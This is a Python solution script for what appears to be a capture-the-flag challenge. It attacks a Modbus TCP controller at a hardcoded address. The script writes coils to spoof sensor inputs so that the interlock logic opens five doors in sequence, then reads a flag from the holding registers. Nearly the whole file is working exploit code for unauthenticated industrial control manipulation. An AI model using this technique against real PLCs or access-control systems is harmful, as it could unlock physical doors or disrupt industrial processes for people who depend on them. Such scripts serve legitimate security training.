#!/usr/bin/python3
import socket
from time import sleep
from umodbus import conf
from umodbus.client import tcp

conf.SIGNED_VALUES = True

HOST = '154.57.164.79'
PORT = 31041

# Coil address map: addr = byte*8 + bit  (from %QX<byte>.<bit>)
SYSTEM_ACTIVE = 602      # %QX75.2
DOOR = {0: 32, 1: 33, 2: 34, 3: 35, 4: 36}
SENSOR = {
    0: 64, 1: 65, 2: 66, 3: 67, 4: 68,
    5: 296, 6: 297, 7: 298, 8: 299, 9: 300,
    10: 416, 11: 422,
    12: 134, 13: 135, 14: 128,
}

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((HOST, PORT))


def write_coil(addr, value):
    msg = tcp.write_single_coil(slave_id=1, address=addr, value=value)
    return tcp.send_message(msg, sock)


def read_coil(addr):
    msg = tcp.read_coils(slave_id=1, starting_address=addr, quantity=1)
    resp = tcp.send_message(msg, sock)
    return resp[0]


def hold_until_door(door_num, coil_values, timeout=25, interval=1):
    """Write coil_values (dict addr->value) once, then poll for the target
    door to latch open."""
    addr = DOOR[door_num]
    for a, v in coil_values.items():
        write_coil(a, v)
    print(f"[*] Waiting for Door_{door_num}...")
    steps = int(timeout / interval)
    for i in range(steps):
        if read_coil(addr) == 1:
            print(f"[+] Door_{door_num} OPEN (t~{i*interval:.1f}s)")
            return True
        sleep(interval)
    print(f"[!] Timeout waiting for Door_{door_num}")
    return False


# base holds that persist across phases once established
base = {SYSTEM_ACTIVE: 1}

# --- Phase 1: Door_3 ---
# IN = NOT D4 AND NOT D1 AND NOT D2 AND NOT D0 AND s13 AND s12 AND NOT s11 AND s10
phase = dict(base)
phase.update({SENSOR[10]: 1, SENSOR[12]: 1, SENSOR[13]: 1, SENSOR[11]: 0})
hold_until_door(3, phase)

# --- Phase 2: break Door_3 (s11=1), open Door_0 ---
# Door_0 IN = NOT D4 AND NOT D3 AND NOT D2 AND NOT D1 AND s4 AND NOT s2 AND s1 AND s0
phase = dict(base)
phase.update({
    SENSOR[10]: 1, SENSOR[12]: 1, SENSOR[13]: 1, SENSOR[11]: 1,  # keep s10-13 held, break via s11=1
    SENSOR[0]: 1, SENSOR[1]: 1, SENSOR[4]: 1, SENSOR[2]: 0,
})
hold_until_door(0, phase)

# --- Phase 3: break Door_0 (s4=0), open Door_4 ---
# Door_4 IN = NOT D1 AND NOT D3 AND NOT D2 AND NOT D0 AND s14 AND s13 AND s12 AND s10
phase = dict(base)
phase.update({
    SENSOR[10]: 1, SENSOR[12]: 1, SENSOR[13]: 1, SENSOR[11]: 1,
    SENSOR[0]: 1, SENSOR[1]: 1, SENSOR[4]: 0, SENSOR[2]: 0,
    SENSOR[14]: 1,
})
hold_until_door(4, phase)

# --- Phase 4: break Door_4 (s14=0), open Door_1 ---
# Door_1 IN = NOT D4 AND NOT D3 AND NOT D2 AND NOT D0 AND s7 AND NOT s6 AND s5 AND s0
phase = dict(base)
phase.update({
    SENSOR[10]: 1, SENSOR[12]: 1, SENSOR[13]: 1, SENSOR[11]: 1,
    SENSOR[0]: 1, SENSOR[14]: 0,
    SENSOR[7]: 1, SENSOR[6]: 0, SENSOR[5]: 1,
})
hold_until_door(1, phase)

# --- Phase 5: break Door_1 (s7=0), open Door_2 (final) ---
# Door_2 IN = NOT D4 AND NOT D3 AND NOT D1 AND NOT D0 AND s11 AND NOT s7 AND s10 AND s5
phase = dict(base)
phase.update({
    SENSOR[10]: 1, SENSOR[11]: 1, SENSOR[5]: 1,
    SENSOR[7]: 0,
})
hold_until_door(2, phase)

print("[+] Sequence complete, reading flag from holding registers...")
for _ in range(5):
    msg = tcp.read_holding_registers(slave_id=1, starting_address=4, quantity=80)
    regs = tcp.send_message(msg, sock)
    if any(regs):
        break
    sleep(0.5)

print("Registers:", regs)
chars = ''.join(chr(r) if r != 0 else '' for r in regs)
print("flag:", chars)

sock.close()
